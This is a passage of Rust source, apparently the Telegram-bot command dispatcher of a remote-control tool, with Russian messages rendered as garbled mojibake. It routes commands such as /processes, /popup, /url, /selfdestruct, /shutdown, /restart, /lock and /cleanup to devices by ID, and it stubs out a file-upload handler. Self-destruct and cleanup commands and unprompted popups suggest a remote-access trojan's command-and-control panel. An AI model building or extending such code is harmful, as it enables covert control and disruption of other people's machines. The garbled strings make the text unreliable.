        
        "/processes" => {
            if parts.len() < 2 {
                telegram_client.send_error(chat_id, "–ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ: /processes <device_id>").await?;
                return Ok(());
            }
            let device_id = parts[1];
            
            match execution_commands::handle_processes_command(&device_manager, device_id).await {
                Ok(response) => {
                    telegram_client.send_long_message(chat_id, &response).await?;
                }
                Err(e) => {
                    telegram_client.send_error(chat_id, &format!("–û—à–∏–±–∫–∞ –ø–æ–ª—É—á–µ–Ω–∏—è —Å–ø–∏—Å–∫–∞ –ø—Ä–æ—Ü–µ—Å—Å–æ–≤: {}", e)).await?;
                }
            }
        }
        
        // Popup –∫–æ–º–∞–Ω–¥—ã
        "/popup" => {
            if parts.len() < 3 {
                telegram_client.send_error(chat_id, "–ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ: /popup <device_id> <message>").await?;
                return Ok(());
            }
            let device_id = parts[1];
            let message = parts[2..].join(" ");
            
            match popup_commands::handle_popup_command(&device_manager, device_id, &message).await {
                Ok(response) => {
                    telegram_client.send_message(chat_id, &response).await?;
                }
                Err(e) => {
                    telegram_client.send_error(chat_id, &format!("–û—à–∏–±–∫–∞ –ø–æ–∫–∞–∑–∞ popup: {}", e)).await?;
                }
            }
        }
        
        // –ü—Ä–æ–¥–≤–∏–Ω—É—Ç—ã–µ –∫–æ–º–∞–Ω–¥—ã
        "/url" => {
            if parts.len() < 3 {
                telegram_client.send_error(chat_id, "–ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ: /url <device_id> <url>").await?;
                return Ok(());
            }
            let device_id = parts[1];
            let url = parts[2..].join(" ");
            
            match advanced_commands::handle_url_command(&device_manager, device_id, &url).await {
                Ok(response) => {
                    telegram_client.send_message(chat_id, &response).await?;
                }
                Err(e) => {
                    telegram_client.send_error(chat_id, &format!("–û—à–∏–±–∫–∞ –æ—Ç–∫—Ä—ã—Ç–∏—è URL: {}", e)).await?;
                }
            }
        }
        
        "/selfdestruct" => {
            if parts.len() < 2 {
                telegram_client.send_error(chat_id, "–ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ: /selfdestruct <device_id> [CONFIRM_DESTROY]").await?;
                return Ok(());
            }
            let device_id = parts[1];
            let confirmation = parts.get(2).copied();
            
            match advanced_commands::handle_selfdestruct_command(&device_manager, device_id, confirmation).await {
                Ok(response) => {
                    telegram_client.send_message(chat_id, &response).await?;
                }
                Err(e) => {
                    telegram_client.send_error(chat_id, &format!("–û—à–∏–±–∫–∞ —Å–∞–º–æ—É–Ω–∏—á—Ç–æ–∂–µ–Ω–∏—è: {}", e)).await?;
                }
            }
        }
        
        "/shutdown" => {
            if parts.len() < 2 {
                telegram_client.send_error(chat_id, "–ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ: /shutdown <device_id> [delay_seconds]").await?;
                return Ok(());
            }
            let device_id = parts[1];
            let delay = parts.get(2).and_then(|s| s.parse().ok());
            
            match advanced_commands::handle_shutdown_command(&device_manager, device_id, delay).await {
                Ok(response) => {
                    telegram_client.send_message(chat_id, &response).await?;
                }
                Err(e) => {
                    telegram_client.send_error(chat_id, &format!("–û—à–∏–±–∫–∞ –≤—ã–∫–ª—é—á–µ–Ω–∏—è: {}", e)).await?;
                }
            }
        }
        
        "/restart" => {
            if parts.len() < 2 {
                telegram_client.send_error(chat_id, "–ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ: /restart <device_id> [delay_seconds]").await?;
                return Ok(());
            }
            let device_id = parts[1];
            let delay = parts.get(2).and_then(|s| s.parse().ok());
            
            match advanced_commands::handle_restart_command(&device_manager, device_id, delay).await {
                Ok(response) => {
                    telegram_client.send_message(chat_id, &response).await?;
                }
                Err(e) => {
                    telegram_client.send_error(chat_id, &format!("–û—à–∏–±–∫–∞ –ø–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∫–∏: {}", e)).await?;
                }
            }
        }
        
        "/lock" => {
            if parts.len() < 2 {
                telegram_client.send_error(chat_id, "–ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ: /lock <device_id>").await?;
                return Ok(());
            }
            let device_id = parts[1];
            
            match advanced_commands::handle_lock_command(&device_manager, device_id).await {
                Ok(response) => {
                    telegram_client.send_message(chat_id, &response).await?;
                }
                Err(e) => {
                    telegram_client.send_error(chat_id, &format!("–û—à–∏–±–∫–∞ –±–ª–æ–∫–∏—Ä–æ–≤–∫–∏ —ç–∫—Ä–∞–Ω–∞: {}", e)).await?;
                }
            }
        }
        
        "/cleanup" => {
            if parts.len() < 2 {
                telegram_client.send_error(chat_id, "–ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ: /cleanup <device_id>").await?;
                return Ok(());
            }
            let device_id = parts[1];
            
            match advanced_commands::handle_cleanup_command(&device_manager, device_id).await {
                Ok(response) => {
                    telegram_client.send_message(chat_id, &response).await?;
                }
                Err(e) => {
                    telegram_client.send_error(chat_id, &format!("–û—à–∏–±–∫–∞ –æ—á–∏—Å—Ç–∫–∏: {}", e)).await?;
                }
            }
        }
        
        _ => {
            if command.starts_with('/') {
                telegram_client.send_error(chat_id, "‚ùì –ù–µ–∏–∑–≤–µ—Å—Ç–Ω–∞—è –∫–æ–º–∞–Ω–¥–∞. –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ /help –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è —Å–ø–∏—Å–∫–∞ –∫–æ–º–∞–Ω–¥.").await?;
            }
        }
    }

    Ok(())
}

/// –û–±—Ä–∞–±–æ—Ç—á–∏–∫ –∑–∞–≥—Ä—É–∑–∫–∏ —Ñ–∞–π–ª–æ–≤
async fn handle_file_upload(
    _document: telegram_client::Document,
    _device_manager: Arc<DeviceManager>,
    telegram_client: TelegramClient,
    chat_id: i64,
) -> Result<()> {
    // –ó–¥–µ—Å—å –±—É–¥–µ—Ç —Ä–µ–∞–ª–∏–∑–æ–≤–∞–Ω–∞ –ª–æ–≥–∏–∫–∞ –∑–∞–≥—Ä—É–∑–∫–∏ —Ñ–∞–π–ª–æ–≤
    // –ü–æ–∫–∞ –æ—Ç–ø—Ä–∞–≤–ª—è–µ–º –∑–∞–≥–ª—É—à–∫—É
    telegram_client.send_message(chat_id, "üìÅ –ó–∞–≥—Ä—É–∑–∫–∞ —Ñ–∞–π–ª–æ–≤ –±—É–¥–µ—Ç —Ä–µ–∞–ª–∏–∑–æ–≤–∞–Ω–∞ –≤ —Å–ª–µ–¥—É—é—â–∏—Ö –æ–±–Ω–æ–≤–ª–µ–Ω–∏—è—Ö").await?;
    Ok(())
}
